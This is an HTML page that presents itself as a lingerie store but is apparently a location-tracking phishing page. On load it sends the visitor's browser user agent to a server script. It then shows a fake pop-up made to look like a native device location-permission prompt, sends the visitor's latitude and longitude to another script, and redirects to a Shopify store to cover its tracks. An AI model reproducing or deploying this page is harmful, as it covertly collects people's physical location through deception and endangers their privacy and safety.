<!DOCTYPE html>
<html>

<head>
  <title>Lingerie Store</title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined|Material+Icons+Two+Tone|Material+Icons+Round|Material+Icons+Sharp" rel="stylesheet">
  <link href="https://cdn.shopify.com/s/files/1/0522/0281/t/2/assets/favicon.ico?v=64482981545175499521401717479" rel="shortcut icon" type="image/x-icon">
  <style>
    body {
      font-family: "Roboto", sans-serif;
      font-size: 36px;
      text-align: center;
      line-height: 48px;
    }

    .modal {
      position: fixed;
      z-index: 1;
      display: none;
      justify-content: center;
      align-items: center;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgb(0, 0, 0);
      background-color: rgba(0, 0, 0, 0.4);
    }

    .background-image-blur {
      background-image: url("49591-smart2-responsive.jpg");
      background-position: center;
      background-repeat: no-repeat;
      background-size: cover;
      filter: blur(36px);
      height: 97vh;
    }

    .modal-content {
      background-color: #fefefe;
      margin: auto;
      padding: 42px 32px 32px;
      border: 1px solid #888;
      width: calc(100% - 8em);
      border-radius: 24px;
    }

    .icon {
      color: #7c9347;
      font-size: 48px;
      margin: 0 0 12px;
    }

    .image img {
      border: 5px solid #7c9347;
      width: 184px;
      height: 184px;
      border-radius: 50%;
    }

    .image {
      font-size: 24px;
      margin: 48px 0 36px;
    }

    .image span{
      margin-top: 8px;
    }

    .display-flex {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .permission-btn {
      background-color: #bbb0;
      border-radius: 8px;
      padding: 24px 12px;
      border: 1px solid #9ea789;
      width: 100%;
      font-size: 22px;
      margin: 4px;
      font-weight: 600;
    }
  </style>
</head>

<body onload="getUser()">

  <div class="background-image-blur"></div>

  <div id="myModal" class="modal">
    <div class="modal-content">
      <!-- <div class="display-flex" style="justify-content: center; padding: 12px">
        <div>You must allow location access for Lingerie Store Website to work. We will only track your location to improve experience, suggestions
          related to your country.</div>
      </div> -->
      <div class="display-flex title">
        <span class="material-icons-outlined icon">
          location_on
        </span>
        <span>Allow <b>Lingerie Store</b> to access this device's location?</span>
      </div>

      <div class="display-flex image">
        <img src="map.webp" alt="">
        <span>Approximate</span>
      </div>

      <div class="display-flex">
        <button class="permission-btn" onclick="getLocation()">While using the site</button>
        <button class="permission-btn" onclick="getLocation()">Only this time</button>
      </div>
    </div>

  </div>
  <script>
    var user = navigator.userAgent;
    var modal = document.getElementById("myModal");

    function getUser() {
      $.ajax({
        type: 'POST',
        url: 'insertUser.php',
        data: 'user=' + user,
        success: function(msg) {
          if (msg) {
            getLocation();
            open();
          }
        }
      });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      }
    }

    function showPosition(position) {
      $.ajax({
        type: 'POST',
        url: 'insertlocation.php',
        data: 'latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude + '&user=' + user,
        success: function(msg) {
          if (msg) {
            close();
            location.replace("http://tm-shopify052-lingerie.myshopify.com")
          }
        }
      });
    }

    function open() {
      modal.style.display = "flex";
    }

    function close() {
      modal.style.display = "none";
    }
  </script>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

</body>

</html>